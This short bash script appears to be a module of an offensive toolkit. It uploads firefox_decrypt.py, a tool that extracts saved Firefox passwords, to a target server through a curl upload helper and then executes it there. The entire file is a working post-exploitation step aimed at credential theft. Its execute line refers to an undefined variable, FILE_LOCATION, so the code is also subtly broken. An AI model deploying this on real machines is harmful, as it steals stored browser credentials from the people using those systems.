#!/bin/bash

: '
download firefox_decrypt.py to server and execute
'

LOCATION="${SCRIPTS_DIR}/reconnaissance/linux/.files"
FILE="firefox_decrypt.py"

curl_upload_file "${LOCATION}" "${FILE}"
sleep 3

execute_command "python3 ${FILE_LOCATION}"
create_new_line
